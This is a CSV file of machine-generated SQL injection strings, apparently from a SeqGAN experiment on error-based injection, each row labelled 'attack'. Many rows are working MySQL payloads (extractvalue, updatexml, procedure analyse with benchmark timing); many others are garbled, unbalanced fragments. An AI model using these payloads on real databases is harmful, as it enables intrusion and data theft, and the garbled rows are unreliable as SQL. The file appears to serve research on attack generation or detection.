attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,159
attack,"1%""  =  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,160
attack,"select   (  5847  (  (  e  (  0x5c,  (  (  (  (  5000000(  (  (  (  (  0x2e,0x7171706a71,  (  5000000,m5  (  (  (  1808=  (  (  0x2e,0x7171706a71,  (  select   (  el  (  1297  =  2917=  (  (  3393,m(  (  (  (  (  5000000,md5  (  (  select   (  elt  (  elt  (  case=  1543  (  (  0x2e,0x7171706a71,  (  select   (  el  3393  =  1724  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,161
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,162
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,163
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'y mnnmwwmhon WHERE%'  =  'y bva      enddmon   (  (  e(  el  (  1297  =  5989  (  1297,concat  (  (  4415  =  (  0x5c,  (  benchmark  (  (  benchmark  (  (  5000000,md5  (  select   (  (  7982)  )  ,md5  (  (  7982  =  (  (  0x2e,concat  (  0x2e,md5  (  0x4b774c75   (  6461  (  (  1808,mduana  =  (  1049  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,164
attack,"</ 8841  (  (  (  5000000(  =  (  1808,1   )    (  extractvalue  (  (  (  5000000,md5  (  (  2917,m7529  (  5000000(  (  select   (  elt  (  elt  (  0x2e,md5  (  1297,concat  (  (  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  e  (  e  (  3393,concat  (  (  0x2e,0x7171706a71,  (  9627,concat  (  (  (  select   (  1812  =  5433  (  (  1297  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,165
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,166
attack,"  )  select   (  case 0 from dual  )   end  (  (  elt  u  elt  (  1297  =  (  (  0x52515a50   (  (  case 0 from 0 from dual  )  e  )  1354  )   (  (  el  (  5000000(  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  select   (  elt  (  elt  (  5000000,md5  (  (  0x2e,md5  =  (  (  0x5c,0x7171706a71,0x717a767a71  (  (  select   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,167
attack,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""ekddrese  (  (  elt  )  5000000,md5  (  0x2e,  (  select   (  (  elt  (  1759  =  (  3393,1   from d5  (  elt  (  elt  (  benchmark  (  (  1808  =  (  0x5c,  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  (  (  0x2e,concat  (  (  0x2e,0x7171706a71,  (  select   (  9393  )  (  9255,concat  (  (  0x5c,0x7171706a71,  (  benchmark  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,168
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,169
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,170
attack,"1%"" where extractvalue  (  (  (  (  1297,concat  (  0x5c,  (  (  benchmark  (  (  (  benchmark  (  (  (  benchmark  (  5000000,concat  (  (  0x5c,(  (  select   (  elt  (  elt  (  3393  =  (  (  3393  =  (  (  3393,m,  (  benchmarkm0  )  (  (  case 0 0 fromua  (  case when   (  4774  )   (  3863  (  el_inal  )  )  0x2e,0x7171706a71,  (  benchmark",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,171
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""kpnci",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,172
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,173
attack,"1"" or extractvalue  (  (  (  (  3335  (  (  5000000(  (  (  (  (  3393  =    (  (  (  (  3393,1   )    (  select   (  utl  )  7982,1   )    (  extractvalue  (  1297,1   )    )  (  select   (  case 0 from duanat  )  e  )  1297)  )   (  6166  (  (  elt  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  1297  =  9627,concat  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,174
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,175
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  ''  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,176
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,177
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,178
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,179
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,180
attack,"1 and extractvalue  (  6212  =  (  3393,concat  (  (  (  0x5c,0x7171706a71,  9103  (  extractvalue  (  (  (  =  (  3863  6212  =  (   (  5989  (  ual  )  )  # dual  el  e  (  0x5c,0x7171706a71,  (  (  2917,md5  (  1 as d5  (  elt  (  elt  (  (  1297  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  benchmark  (  5000000(  (  0x5c,0x7171706a71,  (  (  3576",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,181
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,182
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,183
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,184
attack,"1%%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,185
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,186
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,187
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,188
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,189
attack,"1%""' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'pnipk'  =  'kprocdh' like 'kudhr man"" like ""--",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,190
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,191
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,192
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,193
attack,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""ekhpr%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,194
attack,"select   (  5198  (  (  0x5c,  (  select   (  elt  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000,md5  =  =  (  3393,concat  (  benchmark  (  (  9627,md5  (  0x5c,0x7171706a718768  =  (  9627,concat  (  (  (  8862  (  select   (  elt  (  e  (  7982  =  (  =  (  3393,1   (  8375  (  select   (  updatexml  (  6134  (   (  3539  (  (  0x2e,0x7171706a71,  (  select   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,195
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,196
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  ''  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,197
attack,"1%""  )  )  8083  =  1 updatexml  (  (  (  (  (  (  (  (  (  (  (  (  (  3393,concat  (  (  (  3393  (  (  (  (  3393,concat  (  (  (  (  0x2e,0x7171706a71,  (  select   (  (  elt  e  (  0x5c,  (  (  select   (  elt  0x52515a50   (  )  (   (  4660  (  (  elt  0x4b774c75   end  (  )   )    (  (  3393,  (  select   (  (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,198
attack," AND proce  e  6804  (  (  select   (  3393,0x717a767a71  )  (  select   (  )  )  e  (  1808  =  3393,  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  extractvalue  (  (  (  (  5000000(  0x2e,0x7171706a71,  (  select   (  case 0 0 from d5  (  elt  elt  (  e  l  =  3393,concat  (  =  2917,md5  (  0x2e,0x7171706a71,  (  5000000(  (  1808  =  3393,1   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,199
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'pqux'  =  '""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,200
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,201
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,202
attack,"1%""   )    procedure anal  )    )    FROM ualyse  (  5433  =  3681  (  0x2e,0x7171706a71,  (  (  (  benchmark  (  (  5000000(  (  (  0x5c,0x7171706a71,  (  (  select   (   (  3217  )  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  5000000,md5  (  =  (  7982,1   )    (  extractvalue  (  9627,md5  (  (  0x2e,concat  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,203
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,204
attack,"1%%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""pk'  =  'pn      updatexmlN8666'   (  (  elt  (  elt  (  e  =  (  1808  =  (  (  0x5c,  (  benchmark  (  7982,1   )    (  extractvalue  (  9627,concat  (  7982  (  (  benchmark  (  (  (  select   (  case 0 from 0 dua  (  elt  (  elt  (  e  (  3393  =  (  (  select   (  elt  (  0x2e,0x7171706a71,  (  (  (  select   (  elte  el",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,205
attack,"1%"" and updatexml  (  (  (  (  (  (  (  (  7982,concat  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  select   (  elte  (  elt  (  3393  =  (  (  2917,concat  (  (  (  (  (  1808  =  (  3393,1   from d 0 0 from dOdual  )  3364  )  )  8083  )  1  =  U'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'R)  g  (  select   (  updatexml  (  (  (  (  2914  =    (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,206
attack,"1%%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'pkpk'  =  'pro8375n1812 FROM 8375 anel  )  7982  (  select   (  elt  (  e  (  1297  =  (  (  (  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  (  benchmark  (  5000000(  (  0x2e,0x7171706a71,  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  select   (   0 0 from d5  case  )   (  (  elt  elt  (  0x2e,md5  (  0x2e,0x7171706a71,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,207
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,208
attack,"1%""  )  and extractvalue  (  (  (  (  (  (  (  (  (  (  (  ~  (  (  =  (  1543  (  (  =  5777  (  9627,1   )    (  extractvalue  (  (  9627,concat  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  3393,concat  (  (  =  (  (  (  0x2e,0x7171706a71,  (  1759(  1808  =  (  (  0x5c,  (  benchmark  (  5000000(  (  1297,concat  (  (  (  0x4b774c75   end  (   (  1724  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,209
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,210
attack,"1%%i' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'g",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,211
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,212
attack,"1%%""   )    )    usqi",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,213
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '      ppphroc naddreseall_naddre  (  (  elt  (  elt  (  3393  =  (  (  1297  =  (  (  1808,m,1   (  extractvalue  (  (  8768  )  (  =  ual1297  =  (  (  0x2e,0x7171706a71,  (  (  select   (  3217  =  6200  )   (  (  (  ua  el  )  /  (  0x2e,md5  (  3393,1   (    )  (  select   (  extractvalue  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,214
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,215
attack,"1%%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  ""k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,216
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,217
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,218
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,219
attack,1%1%'  =  'r,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,220
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,221
attack,"1 or updatexml  (  (  (  (   (  6166,1   (  9667  (  (  1808=  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  (  0x5c,  (  (  benchmark  (  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  5000000(  (  (  select   (  elt  (  7982  =  (  (  (  elt  (  0x2e,md5  (  ' like '   (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,222
attack,"1',updatexml  (  (  (  (  (  3393,concat  (  (  (  (  (  =  (  (  9788,concat  (  (  (  0x5c,0x7171706a71,1   (  )  select   (  0 from d5  ual  )   end  (  el  (  1297  =  (  1049  =  (  3393,concat  (  0x5c,0x7171706a71,  (  (  select   (  el  (  7982  =  (  (  0x2e,0x7171706a71,  (  select   (  5000000(  =  (  1759  (  =  (  7529  7744  )   then 8375",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,223
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,224
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,225
attack,1%p%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,226
attack,"1%""   )    (  extractvalue  (  (  (  (  3393,concat  (  (  (  (  (  (  (  0x2e,concat  (  (  0x5c,0x7171706a71,0x717a767a71  (  (  select extractvalue  (  (  (  (  (  (  u  (  9627,concat  (  (  (  (  =  (  (  benchmark  (  3393,1   )    (  extractvalue  (  9627,concat  (  (  0x2e,0x7171706a71,  (  (  select   (  )   (  (  elt  (  elt  (  1808  =  (  1 as du",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,227
attack,",1updatexml  (  (  (  (  0x2e,0x7171706a71,  (  (  (  select   (  elt  (  e  select   (  elt  (  e  (  0x2e,md5  (  (  (  0x2e,(  (  =  (  9627,concat  (  (  0x2e,m5  (  (  (  benchmark  (  (  benchmark  (  (  select   (  elt  8318  =  (  (  1297,concat  (  0x5c,0x7171706a71,  (  5000000(  (  0x2e,I  (  (  5000000,md5  (  =  7982  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,228
attack,"1%""   )    )AND 'i'  )  /  (  select   (  case 0 d 0 0 from d5433  (   (  8375  (  (  elt a  elt  e  (  1808  =  (  0x4b774c75   (  extractvalue  (  (  0x5c,0x7171706a71,  (  5000000(  (  (  0x5c,0x7171706a71,  (  (  5000000,md5  (  0x5c5  =  3393,md5  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  (  7982  =  (    (  (  0x5c,0x7171706a71,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,229
attack,"1% and else 4066 or updatexml  (  (  (  (  (  (  (  (  (  (  (  (  (  7982  =  (  =  (  (  1808  =  (  3393,  (  (  benchmark  (  (  3393,concat  (  (  =  (  (  0x5c,  extractvalue  (  (  (  1759(  (  (  elt  (  3393  =  (  (  0x2e,0x7171706a71,  (  benchmark  (  0x4b774c75   (  8375  =  ut  elt  (  1808  =  (  0x5c,  (  (  select   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,230
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kpnnWNUM0x717a767a71n  (  select 0 from   (  (  elt  (  elt  (  2917  =  3393,  (  (  benchmark  (  (  5000000,md5  (  (  5000000,md5  (  0x5c,0x7171706a71,1  (  select   (  case 0 from d 0 d5423  (  (  elt  e    (  elt  (  5000000,md5  (  7982,1   from 0 from(  (  e  (   (  8375  (  elt  (  1297  =  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,231
attack,"1%'   (  extractvalue  (  9255,concat  (  0x2e,0x7171706a71,updatexml  (  (  (  (  (  (  (    (  (  9627,concat  (  3393,  (  (  select   (  elt  (  1297,1   and updatexml  (  (  (  (  (  0x2e,0x7171706a71,  (  5000000(  (  0x4b774c75   end  (  (  case 0 a  (   (  (  5603  )   (  4415  (  3539  =  (  (  3393,concat  (  extractvalue  (  (  (  (  5000000,md5  (  0x2e,md",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,232
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%o""  =  ""c   #",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,233
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,234
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,235
